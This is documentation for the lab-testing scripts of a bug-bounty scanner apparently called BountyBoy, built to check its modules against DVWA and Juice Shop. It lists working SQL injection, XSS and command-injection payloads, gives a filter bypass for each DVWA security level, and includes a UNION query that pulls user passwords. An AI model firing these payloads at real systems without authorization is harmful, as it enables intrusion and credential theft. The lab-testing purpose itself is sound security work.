# 🧪 Lab Testing Files

Deep dive into the local vulnerable lab testing scripts.

---

## 📄 test_dvwa.py - DVWA Specific Tester

### Overview

```python
"""
BountyBoy - DVWA Specific Tester

Tests DVWA's known vulnerable endpoints after login.
Demonstrates how BountyBoy finds real vulnerabilities.
"""
```

**Purpose:** Test against DVWA (Damn Vulnerable Web Application) to validate our scanners work on real vulnerabilities.

**Why DVWA?**
- Intentionally vulnerable application
- Multiple security levels (Low/Medium/High/Impossible)
- Tests our bypass payloads
- Proves our tools find real bugs

---

### Vulnerability Definitions

```python
DVWA_VULNS = {
    'sqli': {
        'url': '/vulnerabilities/sqli/?id={payload}&Submit=Submit',
        'payloads': [...],
        'indicators': ['mysql', 'syntax', 'query', 'First name:', 'Surname:', 'admin', 'Gordon']
    },
    ...
}
```

**Structure explained:**
- `url`: Endpoint with `{payload}` placeholder
- `payloads`: List of (payload, description) tuples
- `indicators`: Strings that indicate successful exploitation

**Why this structure?**
- Easy to add new vulnerability types
- Self-documenting payloads
- Clear success indicators

---

### SQLi Payloads by Security Level

```python
'payloads': [
    # Basic
    ("1", "Normal request"),
    ("1'", "Single quote - triggers error"),
    
    # Low level - no filtering
    ("1' OR '1'='1", "Basic SQLi"),
    ("1' UNION SELECT user,password FROM users--", "UNION SQLi"),
    
    # Medium bypasses - quotes filtered
    ("1 OR 1=1", "No quotes SQLi (Medium bypass)"),
    ("1 UNION SELECT user,password FROM users", "UNION no quotes"),
    
    # High level bypasses - uses SESSION, harder
    ("1' OR '1'='1'#", "Hash comment SQLi"),
    ("1'/**/OR/**/1=1#", "Comment bypass SQLi"),
    ("-1' UNION SELECT user,password FROM users#", "Negative UNION"),
]
```

**Why different payloads per level?**

| Level | Filter | Bypass Strategy |
|-------|--------|-----------------|
| Low | None | Basic payloads work |
| Medium | Quotes escaped | Use integers, no quotes |
| High | More filtering | Comments, encoding |
| Impossible | Parameterized queries | Nothing works (secure) |

---

### XSS Payloads

```python
'xss_reflected': {
    'payloads': [
        ("<script>alert('XSS')</script>", "Basic XSS"),
        ("<img src=x onerror=alert('XSS')>", "IMG tag XSS"),
        ("<svg onload=alert('XSS')>", "SVG XSS"),
        ("<input onfocus=alert('XSS') autofocus>", "Autofocus XSS"),
        ("'\"><img src=x onerror=alert('XSS')>", "Quote break + IMG"),
    ],
}
```

**Bypass progression:**
1. `<script>` - Basic, often filtered
2. `<img onerror>` - Bypasses script tag filter
3. `<svg onload>` - Another event handler
4. `autofocus` - Triggers without user interaction
5. `'">` prefix - Breaks out of attributes

---

### Command Injection Payloads

```python
'command_injection': {
    'payloads': [
        ("127.0.0.1; id", "Semicolon injection"),        # Low
        ("127.0.0.1 | id", "Pipe injection"),            # Medium bypass
        ("127.0.0.1|id", "No space pipe"),               # High bypass
        ("127.0.0.1\nid", "Newline injection"),          # High bypass
    ],
}
```

**Why these separators?**

| Separator | Works on | Blocked by |
|-----------|----------|------------|
| `;` | Low | Medium+ |
| `\|` (pipe) | Low, Medium | High |
| `\n` (newline) | All levels | Impossible |

---

### SQLi Detection Logic

```python
async def test_sqli(session, base_url, cookies):
    # Get baseline - normal request
    baseline_names = re.findall(r'First name: (\w+)', baseline_content)
    
    for payload, description in vuln['payloads']:
        # Send payload
        names = re.findall(r'First name: (\w+)', content)
        
        is_vuln = False
        
        # MORE users than baseline = injection worked
        if len(names) > len(baseline_names) and len(names) > 1:
            is_vuln = True
        
        # Password hashes in response = UNION worked
        if re.search(r'Surname:.*[a-f0-9]{32}', content):
            is_vuln = True
```

**Detection strategy:**
1. **Baseline comparison:** Normal request returns 1 user
2. **Injection success:** Returns multiple users (OR 1=1)
3. **UNION success:** Password hashes appear in Surname field

**Why not just check for "admin"?**
- "admin" might appear normally
- Comparing counts is more reliable
- MD5 hashes (32 hex chars) are definitive proof

---

### XSS Detection Logic

```python
async def test_xss(session, base_url, cookies):
    for payload, description in vuln['payloads']:
        # Check if payload is reflected UNENCODED
        if payload in content:
            # Make sure it's not HTML encoded
            encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            if encoded_payload not in content:
                # Payload is reflected raw = vulnerable
                is_vuln = True
```

**Why check encoding?**
- `<script>` in response = XSS
- `&lt;script&gt;` in response = SAFE (encoded)
- Must distinguish between the two

---

### Security Level Selection

```python
sec_choice = input("\nSecurity level [1-4, default=1]: ").strip() or "1"
sec_map = {"1": "low", "2": "medium", "3": "high", "4": "impossible"}
security_level = sec_map.get(sec_choice, "low")

cookies = {
    'PHPSESSID': phpsessid,
    'security': security_level  # DVWA reads this cookie!
}
```

**How DVWA security works:**
- Security level stored in cookie
- Each level has different filtering
- We can test all levels without UI

---

## 📄 test_lab.py - ULTIMATE Lab Tester

### Overview

```python
"""
BountyBoy - ULTIMATE Lab Tester

Runs ALL modules against local vulnerable apps.
This is the full arsenal test for local labs.
"""
```

**Purpose:** Run every single BountyBoy module against a local target.

**When to use:**
- Testing against Juice Shop, DVWA, etc.
- Validating all modules work
- Full security assessment of local apps

---

### Module Imports

```python
from src.scanner import Scanner
from src.js_analyzer import JSAnalyzer
from src.wayback import WaybackAnalyzer
from src.fuzzer import PathFuzzer
from src.cors_checker import CORSChecker
from src.header_analyzer import HeaderAnalyzer
from src.ssl_analyzer import SSLAnalyzer
from src.google_dorker import GoogleDorker
from src.dns_analyzer import DNSAnalyzer
from src.open_redirect import OpenRedirectFinder
from src.sqli_scanner import SQLiScanner
from src.xss_scanner import XSSScanner
from src.favicon_hash import FaviconHasher
from src.api_fuzzer import APIFuzzer
from src.ssrf_scanner import SSRFScanner
from src.jwt_analyzer import JWTAnalyzer
from src.idor_scanner import IDORScanner
from src.param_miner import ParamMiner
from src.report_generator import ReportGenerator
```

**Why import everything?**
- Ultimate test = every module
- No subdomain discovery (localhost)
- Direct vulnerability scanning

---

### Phase Structure

```python
# PHASE 1: RECONNAISSANCE
# - JavaScript Analysis
# - Security Headers
# - Favicon Hash
# - Path Fuzzing

# PHASE 2: API & ENDPOINT DISCOVERY
# - API Endpoint Fuzzing
# - Parameter Mining

# PHASE 3: VULNERABILITY SCANNING
# - CORS Check
# - Open Redirect
# - SQLi Scanner
# - XSS Scanner

# PHASE 4: HIGH-VALUE VULNERABILITY CHECKS
# - SSRF Scanner
# - JWT Analysis
# - IDOR Scanner

# PHASE 5: DNS & INFRASTRUCTURE
# - DNS Analysis
# - Google Dork Generation
```

**Why this order?**
1. **Recon first:** Understand the target
2. **Discovery:** Find attack surface
3. **Basic vulns:** Quick wins
4. **High-value:** Big bounty potential
5. **Infrastructure:** Complete picture

---

### Results Container

```python
def initialize_results(target: str) -> dict:
    return {
        'target': target,
        'mode': 'ultimate_lab_test',
        'start_time': datetime.now().isoformat(),
        # Recon
        'js_secrets': [],
        'js_endpoints': [],
        'header_issues': {},
        # API
        'api_endpoints': 0,
        'api_critical': [],
        'graphql_endpoints': [],
        # Vulns
        'cors_vulns': [],
        'sqli_vulns': [],
        'xss_vulns': [],
        # High-value
        'ssrf_critical': [],
        'jwt_vulns': [],
        'idor_critical': [],
        ...
    }
```

**Why structured results?**
- Easy to count findings
- Generate reports
- Track what was tested
- JSON export for tools

---

### Vulnerability Counting

```python
def count_vulns(results: dict) -> int:
    return (
        len(results.get('js_secrets', [])) +
        len(results.get('fuzz_findings', [])) +
        len(results.get('api_critical', [])) +
        len(results.get('cors_vulns', [])) +
        len(results.get('sqli_vulns', [])) +
        len(results.get('xss_vulns', [])) +
        len(results.get('ssrf_critical', [])) +
        len(results.get('jwt_vulns', [])) +
        len(results.get('idor_critical', [])) +
        ...
    )
```

**Why count separately?**
- Different severities
- Different bounty values
- Prioritize manual verification

---

## 📄 test_local.py - Lightweight Lab Tester

### Overview

```python
"""
BountyBoy - Local Lab Tester

Tests all modules against local vulnerable apps.
Skips subdomain discovery since we're testing localhost.
"""
```

**Difference from test_lab.py:**
- Fewer modules (faster)
- No DNS analysis (localhost)
- Quick validation

---

### Simplified Phases

```python
# PHASE 1: BASIC ANALYSIS
# - JavaScript Analysis
# - Security Headers
# - Path Fuzzing

# PHASE 2: VULNERABILITY SCANNING
# - CORS, Open Redirect, SQLi, XSS
# - API Fuzzing

# PHASE 3: HIGH-VALUE CHECKS
# - SSRF, JWT, IDOR
```

**When to use test_local.py vs test_lab.py:**

| Scenario | Use |
|----------|-----|
| Quick validation | test_local.py |
| Full assessment | test_lab.py |
| DVWA specific | test_dvwa.py |
| Real targets | ultimate.py |

---

## 🎯 Usage Examples

```bash
# Test DVWA with security level selection
python test_dvwa.py

# Full arsenal against Juice Shop
python test_lab.py -t localhost:3000 --learn --report

# Quick test against DVWA
python test_local.py -t localhost:8080 --learn

# Generate reports
python test_lab.py -t localhost:3000 --report
```

---

## ⚠️ Important Notes

1. **Always verify findings manually** - Automated scanners have false positives

2. **DVWA security levels:**
   - Low: Everything works
   - Medium: Some filtering
   - High: Strict filtering
   - Impossible: Secure (nothing should work)

3. **If Impossible level shows vulnerabilities** - That's a false positive, check detection logic

4. **Local testing is safe** - No legal issues with your own lab

